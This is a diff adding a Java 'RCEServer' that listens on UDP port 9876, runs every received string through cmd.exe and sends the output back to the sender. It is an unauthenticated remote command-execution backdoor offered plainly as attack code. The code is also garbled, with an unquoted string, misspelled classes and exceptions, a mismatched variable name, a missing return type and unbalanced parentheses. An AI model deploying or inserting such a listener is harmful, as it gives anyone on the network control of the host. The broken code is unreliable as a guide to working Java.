@@ -1,0 +1,68 @@
+import java.io.*;
+import java.net.*;
+
+public class RCEServer {
+public static void main(String[] args) {
+try {
+
+int ServerPort = 9876;
+DatagramSocket s =new DatagramSocket(ServerPort);
+System.out.println(Server is running....);
+
+while(true){
+
+byte[] receiveData = new byte[1024];
+DatagramPacket receivePacket = new DatagramPacket(receiveData,receiveData.Length);
+s.receive(receivePacket);
+
+String command = new String(receivePacket.getData(),0,receivePacket.getLength());
+System.out.println("Received command : "+command);
+
+String result = executeCommand(command);
+
+InetAddress clientAddress = receivedPacket.getAddress();
+int clientPort = receivedPacket.getPort();
+
+byte[] sendData = result.getByte();
+DatagramPacket sendPacket = new DatagramPacket(sendData,sendData.Length,clientAddress,clientPort);
+s.send(sendPacket);
+
+}
+}
+catch(IOExceptions e){
+e.printStackTrace();
+}
+}
+public static executeCommand(String command){
+try{
+
+ProcessBuilder pb = new ProcessBuilder("cmd.exe","/c",command);
+pb.redirectErrorStream(true);
+
+Process p = pb.start();
+
+BufferedReader b = new BufferedReader(new InputStramReader(p.getInputStream()));
+StringBuilder output = new StringBuilder();
+String Line;
+
+while((Line = b.readLine()!=null){
+
+output.append(Line).append("\n");
+
+}
+
+int exitcode = p.waitFor();
+
+if(exitcode == 0){
+return output.toString();
+}else{
+return "Command Execution failed : "+exitcode;
+}
+
+}
+catch(IOException | IterruptsException e){
+e.printStackTrace();
+System.out.println("Error occured :"+e.getMessage());
+}
+}
+}
